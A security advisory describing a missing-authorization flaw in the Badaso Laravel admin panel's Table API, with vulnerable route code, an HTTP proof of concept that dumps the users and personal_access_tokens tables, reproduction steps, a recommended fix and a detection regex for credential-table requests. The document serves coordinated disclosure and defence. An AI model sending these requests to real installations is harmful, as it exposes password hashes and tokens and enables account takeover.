# Security Advisory — Missing authorization in the Table API (`badaso/core`)

> **Identifier:** [CVE to be requested / internal ID OV-2026-005]
> **Publication date:** [to be defined]
> **Last updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 8.1 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`
> **CWE:** CWE-862 — Missing Authorization
> **Status:** Unpatched

---

## 1. Executive summary

A **Missing Authorization** vulnerability was identified in **Badaso** (`badaso/core`), an
open-source Laravel admin panel / backend-as-a-service, version **3.0.0-alpha** (and earlier
2.x releases that expose the same routes). The **Table API** route group (`/badaso-api/v1/table/*`)
is protected by **authentication only** — with **no permission check** — unlike every other
sensitive group (`users`, `roles`, `crud`, `configurations`, …), which use the
`check_permission` middleware.

As a result, **any authenticated user** — including an account with no privileges, or one
created through the open self-registration endpoint — can **read every row of any database
table**, including `users` (password hashes), `personal_access_tokens` and
`password_reset_tokens`. The same group also allows schema enumeration and the generation of a
CRUD/BREAD definition for any table.

Successful exploitation results in **full disclosure of the application database, including
credential material**, and — through the exposed tokens — **account takeover** of other users
and administrators.

---

## 2. Affected products

| Product / Component | Affected versions | Fixed version | Status |
|---|---:|---:|---|
| Badaso (`badaso/core`) | 3.0.0-alpha (and 2.x exposing `table/*`) | — | Affected |

### Unaffected
- The `users`, `roles`, `permissions`, `crud`, `configurations`, `menus` and `activitylogs`
  route groups — these are correctly gated with `config('badaso.middleware.check_permission')`.

---

## 3. Vulnerability description

The vulnerability is caused by the **absence of an authorization check** on the Table API.

The global middleware applied to the whole `/badaso-api` group (`ApiRequest`) performs **no
authentication** — it only sets the request locale and handles maintenance mode, then forwards
the request. Therefore each route is only as protected as its own per-route middleware.

The `table/*` route group declares **only** the authentication middleware
(`BadasoAuthenticate`, a bare token/guard check) and **no** `check_permission` middleware. Any
valid bearer token — from any role — is accepted. The handler then reads an attacker-chosen
table wholesale.

| ID | Route (`/badaso-api/v1/...`) | Handler | Middleware | Effect |
|---|---|---|---|---|
| T1 | `GET table/data?table=<name>` | `BadasoTableController@getDataByTable` | `authenticate` only | Returns **all rows** of any table |
| T2 | `GET table/` | `@browse` | `authenticate` only | Lists **all** table names |
| T3 | `GET table/read?table=<name>` | `@read` | `authenticate` only | Column schema of any table |
| T4 | `GET table/generate-crud?table=<name>` | `@generateCRUD` | `authenticate` only | Creates a BREAD (browse/read/edit/add/delete) for any table |

### Prerequisites
- Authentication required: yes — **any** authenticated user (lowest privilege). The
  registration endpoint (`POST /badaso-api/v1/auth/register`) is public by default, so an
  external attacker can self-provision the account.
- User interaction: none.
- Access: remote (network).

---

## 4. Impact

- **Full database read** by an unprivileged user: `users` (password hashes), application data,
  and secret tables.
- **Account takeover:** reading `personal_access_tokens` / `password_reset_tokens` lets the
  attacker impersonate other users and administrators.
- **Schema disclosure** and **arbitrary BREAD generation** for any table.

### Confidentiality: High — full database contents including credential material.
### Integrity: Low — `generate-crud` persists CRUD definitions for arbitrary tables (and enables further write paths).
### Availability: No direct impact.

---

## 5. Classification

### CVSS
- **Score:** 8.1 — **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`
  *(Primary impact is confidentiality; integrity is rated Low for `generate-crud`. If token theft → admin takeover is counted as `I:H`, the score rises accordingly.)*

### CWE
- **CWE-862 — Missing Authorization** (primary)
- CWE-639 — Authorization Bypass Through User-Controlled Key (IDOR)
- CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor

### CAPEC
- **CAPEC-1 — Accessing Functionality Not Properly Constrained by ACLs**

---

## 6. Exploitation scenario

1. An attacker obtains any account — a low-privilege user, or one created via the public
   `auth/register` endpoint.
2. The attacker logs in and receives a bearer token.
3. The attacker requests `GET /badaso-api/v1/table/data?table=users` with the token.
4. The response returns every user row, including the password-hash column.
5. The attacker repeats with `table=personal_access_tokens` to steal other users'/admins'
   tokens and impersonate them.

---

## 7. Technical evidence

### Affected component
```text
src/Routes/api.php                       (table/* group — authenticate only)
src/Middleware/ApiRequest.php            (global group middleware — no authentication)
src/Controllers/BadasoTableController.php (getDataByTable / browse / read / generateCRUD)
```

### Global middleware does not authenticate
```php
// src/Middleware/ApiRequest.php — handle()
app()->setLocale($lang);
$request->merge(CaseConvert::snake($request->all()));
$request->merge(HandleFile::normalize($request->all()));
if ($this->isUnderMaintenance() || ...) { /* maintenance handling */ }
return $next($request);   // <-- no authentication/authorization
```

### Table group has authentication but no permission
```php
// src/Routes/api.php
Route::group(['prefix' => 'table'], function () {
    Route::get('/',             'BadasoTableController@browse')       ->middleware(config('badaso.middleware.authenticate'));
    Route::get('/read',         'BadasoTableController@read')         ->middleware(config('badaso.middleware.authenticate'));
    Route::get('/data',         'BadasoTableController@getDataByTable')->middleware(config('badaso.middleware.authenticate'));
    Route::get('/generate-crud','BadasoTableController@generateCRUD') ->middleware(config('badaso.middleware.authenticate'));
});
// every other sensitive group instead uses:
//   ->middleware(config('badaso.middleware.check_permission').':<permission>')
```

### Sink — arbitrary table read
```php
// src/Controllers/BadasoTableController.php — getDataByTable()
$request->validate([
    'table' => ['required', function ($attr, $value, $fail) {
        if (! Schema::hasTable($value)) { $fail(...); }   // only checks existence
    }],
]);
$records = DB::table($request->table)->select('*')->get();   // all rows of ANY table
return ApiResponse::success([$request->table => $records]);
```

> **Note:** No tokens, cookies or real data are included in this advisory.

---

## 8. Proof of concept

> **Validation status:** derived from source-code review of `badaso/core` 3.0.0-alpha.
> Dynamic validation against an instance under the researcher's control is recommended before
> public release. No third-party system was accessed.

```http
# 1) obtain a bearer token (low-privilege or self-registered account)
POST /badaso-api/v1/auth/login
Content-Type: application/json

{ "email": "user@example.test", "password": "password" }
# -> response body contains the access token

# 2) read all users incl. password hashes (no admin, no permission)
GET /badaso-api/v1/table/data?table=users
Authorization: Bearer <token>
# -> { "users": [ { "id": 1, "email": "admin@...", "password": "$2y$...", ... }, ... ] }

# variants
GET /badaso-api/v1/table/data?table=personal_access_tokens   Authorization: Bearer <token>
GET /badaso-api/v1/table/                                     Authorization: Bearer <token>
GET /badaso-api/v1/table/read?table=users                    Authorization: Bearer <token>
GET /badaso-api/v1/table/generate-crud?table=users           Authorization: Bearer <token>
```

### Expected result
```text
The users table (and any other requested table) is returned in full, including the
password-hash column, to a request authenticated as a non-privileged user.
```

### PoC limitations
- Read-oriented; does not cause unavailability.
- Does not remove or modify third-party data.
- Creates no persistence or backdoor.
- Contains no real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction steps

1. Install Badaso (`badaso/core`) 3.0.0-alpha on a controlled instance.
2. Create a low-privilege user (or use `POST /badaso-api/v1/auth/register`).
3. Authenticate via `POST /badaso-api/v1/auth/login` and capture the bearer token.
4. Send `GET /badaso-api/v1/table/data?table=users` with `Authorization: Bearer <token>`.
5. Observe the full `users` table in the response, including password hashes.
6. Expected secure behavior: the request should be rejected (403) for a user lacking an
   administrative database permission.

---

## 10. Mitigation

- Restrict/monitor account creation; disable public registration where not required.
- Monitor requests to `/badaso-api/v1/table/*` from non-administrative sessions.
- Apply the fix below.

---

## 11. Fix

No fix available at this time.

### Recommended change
- Gate the entire `table/*` group with the permission middleware, as the other groups already
  do: `->middleware(config('badaso.middleware.check_permission').':browse_database')` (an
  administrator-only permission).
- In `getDataByTable()` / `read()` / `generateCRUD()`, add an explicit administrator check and
  a server-side **allow-list** of permitted tables; never expose credential/framework tables
  (`users`, `password_reset_tokens`, `personal_access_tokens`, `migrations`, …).
- Review the other endpoints that inherit only `ApiRequest` (the `data/*`, `configurations/fetch*`
  and `file/*` endpoints — the latter is CVE-2026-19376).

---

## 12. Detection and indicators

- Requests to `/badaso-api/v1/table/data`, `table/read` or `table/generate-crud` whose `table`
  parameter is `users`, `personal_access_tokens`, `password_reset_tokens`, `migrations`, etc.,
  from non-administrative tokens.

```text
/badaso-api/v1/table/(data|read|generate-crud).*table=(users|personal_access_tokens|password_reset_tokens|migrations)
```

---

## 13. Disclosure timeline

| Date | Event |
|---|---|
| 16/11/2026 | Vulnerability identified (source review) |
| 16/11/2026 | Vulnerability validated (source) |
| [to be defined] | Vendor notified (`badaso.software@gmail.com`) — 14-day window |
| [to be defined] | CVE requested |
| [to be defined] | Advisory published |

---

## 14. Vendor communication

- **Vendor:** Uasoft / Badaso (uasoft-indonesia/badaso)
- **Channel:** e-mail to `badaso.software@gmail.com` (cc `hello@uatech.co.id`)
- **Status:** to be notified
- **Note:** same root cause as **CVE-2026-19376** (File API component); the Table API sibling is
  uncovered and higher impact. The project did not respond to the related report (issue #1100).

---

## 15. Credits

- **Researcher:** Opaque Vector
- **Type:** Independent security researcher
- **Contact:** opaquevector@gmail.com
- **Profile:** https://github.com/opaquevector

---

## 16. References

- https://github.com/uasoft-indonesia/badaso
- https://github.com/uasoft-indonesia/badaso/blob/main/src/Controllers/BadasoTableController.php
- https://vuldb.com/cve/CVE-2026-19376 — related (File API, same root cause)
- https://github.com/uasoft-indonesia/badaso/issues/1100 — related issue (unanswered)
- CWE-862: https://cwe.mitre.org/data/definitions/862.html

---

## 17. Revision history

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal notice

This advisory is published as part of coordinated/responsible vulnerability disclosure, for
defensive and remediation purposes. The findings result from independent security research
conducted by the author through source-code review of the open-source project. The author does
not authorize or endorse the use of this information for unauthorized access, service
disruption, or any unlawful activity.

---

## 19. Contact

- **E-mail:** opaquevector@gmail.com
